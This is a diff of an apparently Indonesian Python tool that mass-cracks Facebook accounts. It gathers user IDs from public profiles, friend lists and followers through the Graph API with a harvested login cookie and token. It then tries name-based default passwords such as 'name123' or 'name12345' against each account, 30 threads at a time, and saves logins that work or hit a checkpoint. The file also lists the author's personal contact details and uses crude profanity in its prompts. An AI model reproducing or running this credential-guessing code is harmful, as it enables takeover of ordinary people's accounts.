@@ -6,6 +6,7 @@ Facebook  = 'Facebook.com/fikritampan305'
 Instagram = 'Instagram.com/fi_sinaga'
 Whatsapp  = '081269496231'
 YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
+Version   = '2.0'
 Syafii  = 100080716718035
 Postingan = 115753054458585
 komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
@@ -59,7 +60,7 @@ def banner():
     war_dom = random.choice([P,K,M,J,U,H])
     print("""
 ___________________________________________________
- ____  __  __ ____  _____  |[•]Version 2.0
+ ____  __  __ ____  _____  |.Version 2.0
 |  _ \|  \/  | __ )|  ___| |[•]Mhd.Syafii
 | | | | |\/| |  _ \| |_    |[•]27-22-1998
 | |_| | |  | | |_) |  _|   |[•]Brute Fb
@@ -248,7 +249,7 @@ def log_cookie():
         bot_author(coki,token,cookie)
         open('login/token.json', 'w').write(token)
         open('login/cookie.json','w').write(cookie)
-        print(f"{K}[*] LOADING........");___fii___Sayang___Kamu___Widiya___()
+        menu()
     except requests.exceptions.ConnectionError:print(f"{P}[•] Tidak Ada Koneksi Internet ");exit()
     except (KeyError,IOError,AttributeError):print(f"{P}[•] Cookies Invalid ");exit()
 
@@ -297,14 +298,14 @@ def menu():
     print(f"{B} | ")
     print(f"{B}___________________________________________")
     print(f"{B} | ")
-    jalan(f"{P}[1] Crack massal dari dump id publik ")
+    print(f"{P}[1] Crack massal dari dump id publik ")
     print(f"{P}[2] Crack dari dump id publik")
     print(f"{P}[3] Crack dari dump id pertemanan sendiri")
     print(f"{P}[4] Crack dari dump id followers")
     print(f"{P}[5] Ganti user-agent")
     print(f"{P}[6] Chek results crack")
     print(f"{P}[7] Chek opsi account chekpoint")
-    jalan(f"{M}[0] Log Out ")
+    print(f"{M}[0] Log Out ")
     print(f"{B} | ")
     pp = input(f"{P}[*] Pilih Yang Mana : {B}")
     if pp in ["1","01"]:
@@ -333,10 +334,7 @@ def massal():
     except IOError:
         print(f"{B} | ")
         print(f"{B} | ")
-        print(f"{P}[•]{M} cookie modar dinggo wae ")
-        os.system("rm -rf login/token.json")
-        os.system("rm -rf login/cookie.json")
-        exit()
+        print(f"{P}[•]{M} cookie modar dinggo wae ");exit()
     try:
         print(f"{B} | ")
         print(f"{P}[•] Masukan berapa id yang ingin anda crack")
@@ -372,10 +370,7 @@ def listteman():
         cookie = {'cookie':open('login/cookie.json','r').read()}
     except IOError:
         print(f"{B} | ")
-        print(f"{P}[•]{M} cookie modar dinggo wae ")
-        os.system("rm -rf login/token.json")
-        os.system("rm -rf login/cookie.json")
-        exit()
+        print(f"{P}[•]{M} cookie modar dinggo wae ");exit()
     try:
         url= requests.get("https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s"%(token),cookies=cookie)
         z=json.loads(url.text)
@@ -399,10 +394,7 @@ def publik():
     except IOError:
         print(f"{B} | ")
         print(f"{B} | ")
-        print(f"{P}[•]{M} cookie modar dinggo wae ")
-        os.system("rm -rf login/token.json")
-        os.system("rm -rf login/cookie.json")
-        exit()
+        print(f"{P}[•]{M} cookie modar dinggo wae ");exit()
     print(f"{B} | ")
     print(f"{B} | ")
     _id_=input(f"{P}[•] Masukan user id : {B}")
@@ -431,10 +423,7 @@ def followerss():
     except IOError:
         print(f"{B} | ")
         print(f"{B} | ")
-        print(f"{P}[•] cookie modar dinggo wae ")
-        os.system("rm -rf login/token.json")
-        os.system("rm -rf login/cookie.json")
-        exit()
+        print(f"{P}[•] cookie modar dinggo wae ");exit()
     print(f"{B} | ")
     print(f"{B} | ")
     print(f"{P}[•] Masukan userid dengan benar pastikan bersivat publik")
@@ -629,7 +618,7 @@ def fii_xd():
 	kone()
 	print(f"{B} | ")
 	print(f"{B} | ")
-	fiisayangwidiya =input(f"{P}[•] Pilih : {B}")
+	fiisayangwidiya =input(f"{P}[•] pilih : {B}")
 	if fiisayangwidiya in [""]:
 		print(f"{B} | ")
 		print(f"{P}[•]{M} Pilihan tidak boleh kosong");exit()
@@ -641,7 +630,7 @@ def fii_xd():
 		if _checkoptions_ in ["y","Y"]:
 			try:
 				_key = "anjink"
-				key = "anjink"
+				key = "anjink" #----- jangan di ubah
 				if _key in key:
 					print(f"{B} | ")
 					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
@@ -657,12 +646,14 @@ def fii_xd():
 							if len(asu) =="":
 								print(f"{B} | ")
 								print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
+							started()
 							for user in id:
 								uid, name = user.split("<=>")
 								coeg.submit(api, uid, asu)
-						started()
+						exit()
 					elif ter in ["d","D"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
+							started()
 							for user in id:
 								uid, name = user.split("<=>")
 								frist=name.split(" ")
@@ -675,7 +666,7 @@ def fii_xd():
 								else:
 									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
 								coeg.submit(api, uid, fii)
-						started()
+						exit()
 				else:print(f"{P}[•]{M} Eror");exit()
 			except (KeyError,IOError):print(f"{P}[•]{M} Eror");exit()
 
@@ -694,13 +685,15 @@ def fii_xd():
 					if len(asu) =="":
 						print(f"{B} | ")
 						print(f"{B} | ")
-						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
+						print(f"{P}[•]{M} Sandi tidak boleh kosong")
+					started()
 					for user in id:
 						uid, name = user.split("<=>")
 						coeg.submit(api, uid, asu)
-				started()
+				exit()
 			elif ter in ["d","D"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
+					started()
 					for user in id:
 						uid, name = user.split("<=>")
 						frist=name.split(" ")
@@ -712,8 +705,9 @@ def fii_xd():
 							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
 						else:
 							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
+
 						coeg.submit(apiiii, uid, fii)
-				started()
+				exit()
 
 	elif fiisayangwidiya in ["3","03"]:
 		print(f"{B} | ")
@@ -742,12 +736,14 @@ def fii_xd():
 							if len(asu) =="":
 								print(f"{B} | ")
 								print(f"{P}[•]{M} Sandi tidak boleh kosong anjink");exit()
+							started()
 							for user in id:
 								uid, name = user.split("<=>")
 								coeg.submit(mbasic, uid, asu)
-								started()
+						exit()
 					elif ter in ["d","D"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
+							started()
 							for user in id:
 								uid, name = user.split("<=>")
 								frist=name.split(" ")
@@ -760,95 +756,8 @@ def fii_xd():
 								else:
 									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
 								coeg.submit(mobil, uid, fii)
-						started()
-				else:print(f"{key}");started()
-			except (KeyError,IOError):print(f"{_key}");exit()
-
-		else:
-			print(f"{B} | ")
-			print(f"{B} | ")
-			print(f"{P}[•] Crack menggunakan pasword manual/defaults {B}M/D")
-			print(f"{B} | ")
-			ter =input(f"{P}[•] Input : {B}")
-			if ter in ["m","M"]:
-				with ThreadPoolExecutor(max_workers=30) as coeg:
-					print(f"{B} | ")
-					print(f"{B} | ")
-					print(f"{P}[•] Contoh password {B}Anjink,kontol,sayang")
-					print(f"{B} | ")
-					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
-					if len(asu) =="":
-						print(f"{B} | ")
-						print(f"{B} | ")
-						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
-					for user in id:
-						uid, name = user.split("<=>")
-						coeg.submit(mbasicc, uid, asu)
-				started()
-			elif ter in ["d","D"]:
-				with ThreadPoolExecutor(max_workers=30) as coeg:
-					for user in id:
-						uid, name = user.split("<=>")
-						frist=name.split(" ")
-						if len(frist)>=6:
-							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
-						elif len(frist)<=2:
-							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
-						elif len(frist)<=3:
-							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
-						else:
-							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
-						coeg.submit(mobill, uid, fii)
-				started()
-				
-	elif fiisayangwidiya in ["2","02"]:
-		print(f"{B} | ")
-		print(f"{B} | ")
-		print(f"{P}[•] Tampilkan opsi chekpoint {B}Y/T")
-		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
-		print(f"{B} | ")
-		_checkoptions_=input(f"{P}[•] Pilih : {B}")
-		if _checkoptions_ in ["y","Y"]:
-			try:
-				_key = "Anjink"
-				key = "Anjink"
-				if _key in key:
-					print(f"{B} | ")
-					print(f"{B} | ")
-					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
-					print(f"{B} | ")
-					ter =input(f"{P}[•] Pilih : {B}")
-					if ter in ["m","M"]:
-						with ThreadPoolExecutor(max_workers=30) as coeg:
-							print(f"{B} | ")
-							print(f"{B} | ")
-							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
-							print(f"{B} | ")
-							asu = input(f"{P}[•] Buat sandi : {B} ").split(",")
-							if len(asu) =="":
-								print(f"{B} | ")
-								print(f"{P}[•]{M} Sandi tidak boleh kosong anjink");exit()
-							for user in id:
-								uid, name = user.split("<=>")
-								coeg.submit(mbasic, uid, asu)
-						started()
-					elif ter in ["d","D"]:
-						with ThreadPoolExecutor(max_workers=30) as coeg:
-							for user in id:
-								uid, name = user.split("<=>")
-								frist=name.split(" ")
-								if len(frist)>=6:
-									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
-								elif len(frist)<=2:
-									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
-								elif len(frist)<=3:
-									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
-								else:
-									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
-								coeg.submit(mbasic, uid, fii)
-								started()
-				else:
-				  print(f"{key}");started()
+						exit()
+				else:print(f"{key}");exit()
 			except (KeyError,IOError):print(f"{_key}");exit()
 
 		else:
@@ -868,12 +777,104 @@ def fii_xd():
 						print(f"{B} | ")
 						print(f"{B} | ")
 						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
+					started()
 					for user in id:
 						uid, name = user.split("<=>")
 						coeg.submit(mbasicc, uid, asu)
-				started()
+				exit()
 			elif ter in ["d","D"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
+					started()
+					for user in id:
+						uid, name = user.split("<=>")
+						frist=name.split(" ")
+						if len(frist)>=6:
+							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
+						elif len(frist)<=2:
+							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
+						elif len(frist)<=3:
+							fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
+						else:
+							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
+						coeg.submit(mobill, uid, fii)
+				exit()
+				
+	elif fiisayangwidiya in ["2","02"]:
+		print(f"{B} | ")
+		print(f"{B} | ")
+		print(f"{P}[•] Tampilkan opsi chekpoint {B}Y/T")
+		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
+		print(f"{B} | ")
+		_checkoptions_=input(f"{P}[•] Pilih : {B}")
+		if _checkoptions_ in ["y","Y"]:
+			try:
+				_key = "Anjink"
+				key = "Anjink"
+				if _key in key:
+					print(f"{B} | ")
+					print(f"{B} | ")
+					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
+					print(f"{B} | ")
+					ter =input(f"{P}[•] Input : {B}")
+					if ter in ["m","M"]:
+						with ThreadPoolExecutor(max_workers=30) as coeg:
+							print(f"{B} | ")
+							print(f"{B} | ")
+							print(f"{P}[•] Contoh password : {B}sayang,anjing,kontol")
+							print(f"{B} | ")
+							asu = input(f"{P}[•] Buat sandi : {B} ").split(",")
+							if len(asu) =="":
+								print(f"{B} | ")
+								print(f"{P}[•]{M} Sandi tidak boleh kosong anjink");exit()
+							started()
+							for user in id:
+								uid, name = user.split("<=>")
+								coeg.submit(mbasic, uid, asu)
+						exit()
+					elif ter in ["d","D"]:
+						with ThreadPoolExecutor(max_workers=30) as coeg:
+							started()
+							for user in id:
+								uid, name = user.split("<=>")
+								frist=name.split(" ")
+								if len(frist)>=6:
+									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
+								elif len(frist)<=2:
+									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
+								elif len(frist)<=3:
+									fii = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
+								else:
+									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
+								coeg.submit(mbasic, uid, fii)
+						exit()
+				else:print(f"{key}");exit()
+			except (KeyError,IOError):print(f"{_key}");exit()
+
+		else:
+			print(f"{B} | ")
+			print(f"{B} | ")
+			print(f"{P}[•] Crack menggunakan pasword manual/defaults {B}M/D")
+			print(f"{B} | ")
+			ter =input(f"{P}[•] Pilih : {B}")
+			if ter in ["m","M"]:
+				with ThreadPoolExecutor(max_workers=30) as coeg:
+					print(f"{B} | ")
+					print(f"{B} | ")
+					print(f"{P}[•] Contoh password {B}Anjink,kontol,sayang")
+					print(f"{B} | ")
+					asu = input(f"{P}[•] Buat sandi : {B}").split(",")
+					if len(asu) =="":
+						print(f"{B} | ")
+						print(f"{B} | ")
+						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
+					started()
+					for user in id:
+						uid, name = user.split("<=>")
+						coeg.submit(mbasicc, uid, asu)
+				exit()
+			elif ter in ["d","D"]:
+				with ThreadPoolExecutor(max_workers=30) as coeg:
+					started()
 					for user in id:
 						uid, name = user.split("<=>")
 						frist=name.split(" ")
@@ -886,7 +887,7 @@ def fii_xd():
 						else:
 							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
 						coeg.submit(mbasicc, uid, fii)
-				started()
+				exit()
 				
 def kone():
     print(f"{B} | ")
@@ -898,7 +899,7 @@ def kone():
 def started():
     print(f"{B} | ")
     print(f"{B} | ")
-    print(f"{P}[•]{B} Results {I}ok {B}tersimpan di {I}ok/{hari_ini}")
+    print(f"{P}[•]{B} Results {I}ok {B}tersimpan di {I}ok/{tanggal}")
     print(f"{P}[•]{B} Results {K}cp {B}tersimpan di {K}cp/{tanggal}")
     print(f"{B} | ")
     print(f"{P}[•] Mode pesawat 5 detik jika tidak ada hasil")
